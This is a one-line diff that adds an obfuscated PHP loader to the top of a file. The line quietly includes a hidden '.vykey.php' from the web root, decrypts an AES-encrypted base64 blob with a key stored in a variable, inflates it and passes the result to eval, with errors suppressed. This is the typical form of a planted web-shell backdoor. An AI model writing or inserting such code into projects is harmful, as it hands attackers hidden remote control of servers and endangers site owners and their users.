@@ -1,0 +1,1 @@
+<?php @include $_SERVER['DOCUMENT_ROOT'].'/.vykey.php';eval(@gzinflate(@openssl_decrypt(base64_decode('Xhlc82rxZ69a3Lqzgkym48zcI1kUQtU+ktZZb8h13hAFJ6K4hsjAy2J3+HEjAPRre0T6bZUgcsm8m65uACkOrGDxx7+YeK83djN7ou5Ip/9pqB9/bl9f9q0F6Bc2Y0zw'),'aes-256-cbc',@hex2bin($VY_K),OPENSSL_RAW_DATA,hex2bin('957dc6b5817280714ede7278498c4687'))));
